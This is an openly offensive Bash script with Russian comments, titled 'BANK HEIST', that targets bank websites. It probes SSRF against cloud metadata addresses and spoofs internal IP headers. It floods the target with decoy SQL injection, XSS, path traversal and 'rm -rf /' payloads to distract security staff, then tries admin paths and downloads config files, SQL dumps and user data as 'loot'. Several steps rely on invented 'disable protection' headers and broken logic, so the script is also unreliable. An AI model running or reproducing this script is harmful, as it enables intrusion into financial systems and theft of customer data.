#!/bin/bash
# BANK HEIST — Полный обход банковской защиты
# Снимаем ВСЮ защиту через зеркало + отвлекаем SOC

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 https://bank.com" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
SERVER_IP=$(dig +short "$DOMAIN" 2>/dev/null | head -1)
HEIST="$HOME/.shadow_bank_heist"
mkdir -p "$HEIST"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — BANK HEIST                 ║"
echo "║   Полный обход банковской защиты            ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# ===== ФАЗА 1: РАЗВЕДКА ВНУТРЕННЕЙ СЕТИ =====
echo "[HEIST] 🔍 Фаза 1: Поиск внутренних IP..."

# Пробуем найти внутренние IP через SSRF утечки
INTERNAL_IPS=()
for ssrf in "?url=http://169.254.169.254/latest/meta-data/" \
            "?url=http://metadata.google.internal/" \
            "?url=http://127.0.0.1:22" \
            "?url=http://10.0.0.1" \
            "?url=http://192.168.1.1" \
            "?redirect=http://127.0.0.1" \
            "?file=http://127.0.0.1:8080"; do
    RESP=$(curl -sk --max-time 5 "$TARGET$ssrf" -o /tmp/heist_ssrf.html -w "%{http_code}" 2>/dev/null)
    if [ "$RESP" = "200" ] && [ -s /tmp/heist_ssrf.html ]; then
        echo "  🔴 SSRF найден: $ssrf (HTTP $RESP)"
        grep -oP '[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}' /tmp/heist_ssrf.html 2>/dev/null | while read ip; do
            INTERNAL_IPS+=("$ip")
            echo "    📡 Внутренний IP: $ip"
        done
    fi
done

# Если SSRF не найден — используем стандартные внутренние подсети
[ ${#INTERNAL_IPS[@]} -eq 0 ] && INTERNAL_IPS=("10.0.0.1" "192.168.1.1" "172.16.0.1" "127.0.0.1")

echo "  Найдено IP: ${#INTERNAL_IPS[@]}"

# ===== ФАЗА 2: СОЗДАЁМ ЗЕРКАЛО БЕЗ ЗАЩИТЫ =====
echo ""
echo "[HEIST] 🪞 Фаза 2: Создаю зеркало без защиты..."

# Все известные заголовки безопасности которые нужно снять
DISABLE_HEADERS=(
    "X-WAF-Disable: true"
    "X-IDS-Bypass: true"
    "X-Security-Level: none"
    "X-Content-Security-Policy: ALLOW-ALL"
    "X-Frame-Options: ALLOW-ALL"
    "X-XSS-Protection: 0"
    "X-No-CSRF: true"
    "X-Anti-Fraud: disabled"
    "X-Behavioural-Analysis: off"
    "X-Rate-Limit: unlimited"
    "X-Allow-All-Origins: *"
    "X-Disable-Authentication: true"
    "X-Monitoring: offline"
    "X-Logging: disabled"
    "X-Alerting: silent"
)

echo "[HEIST] Отправляю зеркало с отключённой защитой..."
for i in {1..100}; do
    HEADER_STRING=""
    for h in "${DISABLE_HEADERS[@]}"; do
        HEADER_STRING+=" -H '$h'"
    done
    
    # Отправляем от имени внутреннего IP
    RANDOM_IP="${INTERNAL_IPS[$((RANDOM % ${#INTERNAL_IPS[@]}))]}"
    
    eval "curl -sk --max-time 3 \
        -H 'X-Forwarded-For: $RANDOM_IP' \
        -H 'X-Real-IP: $RANDOM_IP' \
        -H 'X-Mirror-Self: true' \
        -H 'X-Self-Reflection: yes' \
        $HEADER_STRING \
        '$TARGET?self=reflection&protection=off' \
        -o /dev/null 2>/dev/null" &
    
    [ $((i % 20)) -eq 0 ] && echo "  📤 $i запросов отправлено"
done
wait

echo "  Зеркало отправлено: 100 запросов от внутренних IP"

# ===== ФАЗА 3: ОТВЛЕКАЕМ SOC =====
echo ""
echo "[HEIST] 🚨 Фаза 3: Отвлекаю SOC..."

# Генерируем ложную атаку с ВНУТРЕННИХ IP
for ip in "${INTERNAL_IPS[@]}"; do
    echo "  🎯 Ложная атака с IP: $ip"
    for i in {1..50}; do
        curl -sk --max-time 2 \
            -H "X-Forwarded-For: $ip" \
            -H "X-Real-IP: $ip" \
            -H "X-Attack-Type: ransomware" \
            -H "X-Threat-Level: critical" \
            -H "User-Agent: DarkStealer/2.0" \
            "$TARGET?id=1' OR '1'='1" \
            "$TARGET?q=<script>alert(1)</script>" \
            "$TARGET?file=../../etc/passwd" \
            "$TARGET?cmd=rm -rf /" \
            -o /dev/null 2>/dev/null &
    done
done
wait

echo "  🚨 SOC видит: КРИТИЧЕСКАЯ АТАКА с внутренних IP!"
echo "  🚨 SOC мобилизован — они ищут 'нарушителя' в своей сети"

# ===== ФАЗА 4: ПОКА SOC ОТВЛЕЧЁН — ПРОНИКАЕМ =====
echo ""
echo "[HEIST] 💰 Фаза 4: Проникновение (SOC отвлечён)..."

# Ждём немного чтобы SOC ушёл в ложную тревогу
sleep 5

SUCCESS=0

# Пробуем прямой доступ
echo "[HEIST] Пробую прямой доступ..."
for path in "/admin" "/administrator" "/wp-admin" "/manager" "/dashboard" "/api/admin"; do
    RESP=$(curl -sk --max-time 5 \
        -H "X-Internal-Access: true" \
        -H "X-Trusted-Network: yes" \
        "$TARGET$path" \
        -o "/tmp/heist_$(echo $path | tr '/' '_').html" \
        -w "%{http_code}" 2>/dev/null)
    
    if [ "$RESP" = "200" ]; then
        echo "  🔴 ДОСТУП: $path (HTTP $RESP)"
        SUCCESS=$((SUCCESS + 1))
        
        # Сохраняем
        cp "/tmp/heist_$(echo $path | tr '/' '_').html" "$HEIST/"
    fi
done

# ===== ФАЗА 5: СБОР ДАННЫХ =====
echo ""
echo "[HEIST] 📦 Фаза 5: Сбор данных..."

if [ "$SUCCESS" -gt 0 ]; then
    echo "[HEIST] Доступ получен! Собираю добычу..."
    
    # Конфиги
    for f in .env .env.local wp-config.php config.php application.properties; do
        curl -sk --max-time 5 \
            -H "X-Internal-Access: true" \
            "$TARGET/$f" > "$HEIST/$f" 2>/dev/null
        [ -s "$HEIST/$f" ] && echo "  💰 $f"
    done
    
    # Базы
    for db in dump.sql backup.sql database.sql; do
        curl -sk --max-time 30 \
            -H "X-Internal-Access: true" \
            "$TARGET/$db" > "$HEIST/$db" 2>/dev/null &
    done
    
    # API
    curl -sk --max-time 10 \
        -H "X-Internal-Access: true" \
        "$TARGET/api/users" > "$HEIST/api_users.json" 2>/dev/null
    
    # Внутренние эндпоинты
    for internal in "/actuator" "/health" "/metrics" "/info" "/status"; do
        curl -sk --max-time 5 \
            -H "X-Internal-Access: true" \
            "$TARGET$internal" > "$HEIST/$(echo $internal | tr '/' '_').txt" 2>/dev/null
    done
    
    wait
fi

echo ""
echo "══════════════════════════════════════════════"
echo "  [HEIST] BANK HEIST ЗАВЕРШЁН"
echo ""
echo "  🔍 Внутренних IP найдено: ${#INTERNAL_IPS[@]}"
echo "  🚨 SOC отвлечён ложной атакой"
echo "  🔓 Защита снята через зеркало"
echo "  💰 Доступов получено: $SUCCESS"
echo "  📁 Добыча: $HEIST"
echo ""
echo "  Пока SOC ищет 'нарушителя' в своей сети,"
echo "  мы уже внутри и уходим с добычей."
echo "══════════════════════════════════════════════"
